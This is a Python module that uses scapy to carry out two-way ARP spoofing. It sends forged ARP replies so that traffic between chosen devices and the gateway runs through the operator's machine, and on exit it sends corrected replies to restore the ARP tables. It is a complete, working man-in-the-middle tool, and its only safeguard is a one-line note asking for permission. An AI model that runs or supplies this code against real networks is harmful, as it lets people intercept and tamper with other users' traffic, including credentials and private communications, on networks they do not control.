"""
arp_spoof.py
Handles ARP spoofing (two-way) so traffic between a target device
and the gateway flows through this machine, and restores ARP
tables cleanly on exit.

IMPORTANT: Only use this on networks/devices you own or have explicit
permission to monitor.
"""

import time
import threading
from scapy.all import ARP, send, conf


class ARPSpoofer:
    def __init__(self, own_mac, gateway_ip, gateway_mac, iface=None, interval=2):
        self.own_mac = own_mac
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.iface = iface or conf.iface
        self.interval = interval

        self._targets = {}  # ip -> mac
        self._lock = threading.Lock()
        self._stop_event = threading.Event()
        self._thread = None

    def add_target(self, target_ip, target_mac):
        with self._lock:
            self._targets[target_ip] = target_mac

    def remove_target(self, target_ip):
        with self._lock:
            self._targets.pop(target_ip, None)

    def _spoof_once(self, target_ip, target_mac):
        # Tell target: "I am the gateway"
        pkt_to_target = ARP(
            op=2, pdst=target_ip, hwdst=target_mac,
            psrc=self.gateway_ip, hwsrc=self.own_mac
        )
        # Tell gateway: "I am the target"
        pkt_to_gateway = ARP(
            op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
            psrc=target_ip, hwsrc=self.own_mac
        )
        try:
            send(pkt_to_target, iface=self.iface, verbose=False)
            send(pkt_to_gateway, iface=self.iface, verbose=False)
        except Exception:
            # A transient send failure for one target should never kill
            # the whole spoofing loop — it just tries again next tick.
            pass

    def _restore_once(self, target_ip, target_mac):
        # Tell target the gateway's real MAC
        pkt_to_target = ARP(
            op=2, pdst=target_ip, hwdst=target_mac,
            psrc=self.gateway_ip, hwsrc=self.gateway_mac
        )
        # Tell gateway the target's real MAC
        pkt_to_gateway = ARP(
            op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
            psrc=target_ip, hwsrc=target_mac
        )
        # Send a few times to make sure it sticks. Guarded: if restoring
        # ARP tables for one target fails, that must never stop the
        # other targets from being restored too (see stop_and_restore,
        # which calls this once per target in a loop) — a partially
        # restored network is exactly the broken state this exists to
        # prevent.
        try:
            send(pkt_to_target, iface=self.iface, verbose=False, count=3)
            send(pkt_to_gateway, iface=self.iface, verbose=False, count=3)
        except Exception:
            pass

    def _loop(self):
        while not self._stop_event.is_set():
            with self._lock:
                targets = dict(self._targets)
            for ip, mac in targets.items():
                self._spoof_once(ip, mac)
            # wait() instead of sleep() so Ctrl+C / Stop is noticed
            # immediately instead of waiting out the full interval —
            # correctness doesn't depend on this (stop_and_restore()
            # already joins the thread before restoring, so the order
            # was always safe either way), this just makes shutdown
            # feel instant instead of laggy.
            self._stop_event.wait(self.interval)

    def start(self):
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop_and_restore(self):
        self._stop_event.set()
        if self._thread:
            self._thread.join(timeout=5)
        with self._lock:
            targets = dict(self._targets)
        for ip, mac in targets.items():
            self._restore_once(ip, mac)
